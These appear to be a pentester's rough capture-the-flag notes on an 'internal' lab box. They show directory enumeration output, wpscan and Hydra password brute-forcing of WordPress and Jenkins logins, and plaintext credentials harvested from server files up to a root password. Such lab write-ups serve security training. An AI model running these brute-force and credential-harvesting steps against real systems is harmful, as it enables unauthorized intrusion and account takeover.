┌──(kali㉿kali)-[~/sectools/dirsearch]
└─$ ./dirsearch.py -u 10.10.21.239 -e aspx,php                                                        127 ⨯

  _|. _ _  _  _  _ _|_    v0.4.1                                                                            
 (_||| _) (/_(_|| (_| )                                                                                     
                                                                                                            
Extensions: aspx, php | HTTP method: GET | Threads: 30 | Wordlist size: 9432

Output File: /home/kali/sectools/dirsearch/reports/10.10.21.239/_21-05-31_07-14-28.txt

Error Log: /home/kali/sectools/dirsearch/logs/errors-21-05-31_07-14-28.log

this threader3000 scanner is damn fast
/home/kali/sectools/threader3000.py

Target: http://10.10.21.239/
                                                                                                            
[07:14:29] Starting: 
[07:14:36] 403 -  277B  - /.ht_wsr.txt                                    
[07:14:36] 403 -  277B  - /.htaccess.bak1
[07:14:36] 403 -  277B  - /.htaccess.orig
[07:14:36] 403 -  277B  - /.htaccess.sample
[07:14:36] 403 -  277B  - /.htaccess.save
[07:14:36] 403 -  277B  - /.htaccess_extra
[07:14:36] 403 -  277B  - /.htaccess_orig
[07:14:36] 403 -  277B  - /.htaccess_sc
[07:14:36] 403 -  277B  - /.htaccessBAK
[07:14:36] 403 -  277B  - /.htaccessOLD
[07:14:36] 403 -  277B  - /.htaccessOLD2
[07:14:36] 403 -  277B  - /.htm            
[07:14:36] 403 -  277B  - /.html
[07:14:36] 403 -  277B  - /.htpasswd_test
[07:14:36] 403 -  277B  - /.htpasswds
[07:14:36] 403 -  277B  - /.httr-oauth
[07:14:38] 403 -  277B  - /.php                                                   
[07:14:59] 301 -  311B  - /blog  ->  http://10.10.21.239/blog/                      
[07:15:01] 200 -    4KB - /blog/wp-login.php                                        
[07:15:01] 200 -   53KB - /blog/                                                           
[07:15:10] 200 -   11KB - /index.html                                                                      
[07:15:11] 301 -  317B  - /javascript  ->  http://10.10.21.239/javascript/ 
[07:15:19] 200 -   13KB - /phpmyadmin/doc/html/index.html                                                  
[07:15:19] 301 -  317B  - /phpmyadmin  ->  http://10.10.21.239/phpmyadmin/
[07:15:21] 200 -   10KB - /phpmyadmin/                                                             
[07:15:21] 200 -   10KB - /phpmyadmin/index.php                                                         
[07:15:24] 403 -  277B  - /server-status                                                           
[07:15:24] 403 -  277B  - /server-status/    
[07:15:32] 200 -    4KB - /wordpress/wp-login.php                                                     
                                                                                      
Task Completed                                     





http://10.10.169.252/blog
http://10.10.169.252/javascript
http://10.10.169.252/phpmyadmin
http://10.10.169.252/server-status
http://10.10.169.252/wordpress


change the etc/host file to include
<ip>   internal.blog 


wpscan --url http://10.10.169.252/blog --usernames admin --passwords /home/kali/SecLists/Passwords/xato-net-10-million-passwords-100000.txt --max-threads 50


└─$ wpscan --url http://10.10.169.252/blog -e vp,u            148 ⨯ 2 ⚙

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php



$ cd opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123



aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:36045         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    324 10.10.169.252:22        10.11.37.146:54394      ESTABLISHED on (0.37/0/0)
tcp        0      0 10.10.169.252:44640     10.11.37.146:54         ESTABLISHED off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 10.10.169.252:80        10.11.37.146:51106      ESTABLISHED keepalive (5431.85/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.169.252:68        0.0.0.0:*                           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path



wpscan --url http://10.10.21.239/blog --usernames admin --passwords /home/kali/seclists/Passwords/xato-net-10-million-passwords-100000.txt --max-threads 50

im able to lgin to the phpdb

/etc/phpmyadmin/config-db.php:$dbpass='B2Ud4fEOZmVq';                                                       
/etc/phpmyadmin/config-db.php:$dbuser='phpmyadmin';


www-data@internal:/opt$ ls -lah
ls -lah
total 16K
drwxr-xr-x  3 root root 4.0K Aug  3  2020 .
drwxr-xr-x 24 root root 4.0K Aug  3  2020 ..
drwx--x--x  4 root root 4.0K Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123


[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-31 13:38:22

Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123